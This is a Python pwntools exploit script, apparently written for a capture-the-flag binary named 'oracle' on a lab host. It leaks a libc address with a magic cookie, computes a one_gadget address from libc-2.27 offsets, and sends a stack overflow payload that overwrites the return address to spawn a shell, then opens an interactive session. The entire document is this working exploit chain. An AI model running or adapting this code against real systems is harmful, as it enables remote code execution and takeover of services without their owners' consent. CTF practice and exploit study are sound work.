#!/usr/bin/env python2
# -*- coding: utf-8 -*-

from pwn import *

HOST = "10.13.37.66"
PORT = 1337

BINARY = "target/release/oracle"
dir_path = os.path.dirname(os.path.realpath(__file__))

elf = ELF(BINARY)
context.update(binary=elf)
context.log_level = "debug" if "debug" in sys.argv else "info"
context.terminal = ['tmux', 'splitw', '-h']

LIBC = None
LOCAL = "remote" not in sys.argv
DEBUG = "debug" in sys.argv
MAGIC_TEXT="u1F52E"
MAGIC_COOKIE="boogyismyhero"

if LOCAL:
    r = process(BINARY)
else:
    r = remote(HOST, PORT)

if "gdb" in sys.argv or DEBUG:
    gdb.attach("{}/{}".format(dir_path, BINARY), """
            load-pwndbg\n
            c\n
    """)

## one gadgets available in libc-2.27.so
## ubuntu 18.04 LTS
"""
0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rcx == NULL

0x4f322 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a38c        execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
"""

libc = ELF(LIBC) if LIBC else elf.libc
libc_offset = 0xb6b70
one_gadget = 0x4f2c5
# one_gadget = 0x4f322

print(r.readuntil("Ask μαντείο your question !"))
log.info("Sending leak text")
r.sendline("{0}{1}".format(MAGIC_TEXT, MAGIC_COOKIE))

print(r.readline())
r.readuntil(": ")
leak_addr = r.readline()
leak_addr = int(leak_addr)
# leak_addr = r.readlines(2)[1][-15:]
# print("Leaked address: "+"".join(leak_addr))
print("Leaked address: %#x" % leak_addr)

# leak = re.findall("[0-9]+", leak_addr)
leak = int(leak_addr)

libc_base = leak - libc_offset
onegadget = libc_base + one_gadget

log.info("leak libc::strncpy    -> {}".format(hex(leak)))
log.info("leak libc::base       -> {}".format(hex(libc_base)))
log.info("leak libc::one_gadget -> {}".format(hex(onegadget)))

payload = "\x41"*(1032)
payload += p64(onegadget)
payload += "\x42"*(2048-1032-len(p64(onegadget)))

log.info(hexdump(payload))

print(r.readuntil("Do you have enything else to ask μαντείο ?"))
log.info("Sending payload ...")
r.sendline("{0}{1}".format(MAGIC_TEXT, payload))

print(r.read(2048, timeout=4))
# r.sendline("cat flag")
r.interactive()


